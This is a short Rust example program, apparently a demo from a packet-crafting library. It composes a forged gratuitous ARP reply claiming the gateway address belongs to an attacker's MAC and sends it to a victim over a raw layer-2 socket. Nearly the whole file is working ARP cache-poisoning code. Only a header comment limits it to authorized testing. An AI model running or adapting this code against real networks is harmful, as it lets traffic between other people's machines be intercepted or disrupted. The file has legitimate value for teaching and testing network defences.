//! **forge_arp** — compose a gratuitous **ARP reply** (cache poisoning) and inject it at L2.
//!
//! Claims a victim IP is at the attacker's MAC, framed in Ethernet and sent on a chosen
//! interface. Run with `sudo -E cargo run -p demos --example forge_arp -- <iface>` (composing
//! works unprivileged; the raw send needs `CAP_NET_RAW` + an interface). **Authorized testing
//! only** — ARP poisoning a network you don't own is illegal.
#![allow(clippy::print_stdout)]

use arp::ArpPacket;
use ethernet::{Ethernet, EthernetHeader};
use ethertype::EtherType;
use rawsock::{LinkSocket, ProtocolExt, RawIo, capabilities};
use std::net::Ipv4Addr;

fn main() {
    let attacker_mac = [0x02, 0x00, 0x00, 0x00, 0x00, 0xff];
    let claimed_ip = Ipv4Addr::new(10, 0, 0, 1); // e.g. the gateway — we claim to own it
    let victim_mac = [0x02, 0x00, 0x00, 0x00, 0x00, 0x01]; // whose cache we poison
    let victim_ip = Ipv4Addr::new(10, 0, 0, 2);

    // "claimed_ip is-at attacker_mac", addressed to the victim — an unsolicited reply.
    let reply = ArpPacket::reply(attacker_mac, claimed_ip, victim_mac, victim_ip);
    let frame = Ethernet::new(
        EthernetHeader {
            dst: victim_mac,
            src: attacker_mac,
            ethertype: EtherType::Custom(0), // filled to ARP (0x0806) from the payload
        },
        reply,
    );
    let bytes = frame.encode();

    println!(
        "forged ARP reply  {claimed_ip} is-at {attacker_mac:02x?}  -> {victim_ip}  ({} bytes)",
        bytes.len()
    );
    println!("  {:02x?}", bytes);

    if capabilities().link {
        let iface = std::env::args()
            .nth(1)
            .unwrap_or_else(|| "eth0".to_string());
        match LinkSocket::open(&iface) {
            Ok(mut sock) => match sock.send_raw(&bytes) {
                Ok(n) => println!("sent {n} bytes on {iface} via a raw L2 socket \u{2713}"),
                Err(e) => println!("send on {iface} failed: {e}"),
            },
            Err(e) => println!("open {iface} failed: {e}"),
        }
    } else {
        println!("(no CAP_NET_RAW \u{2014} composed only; run with the capability + an interface)");
    }
}
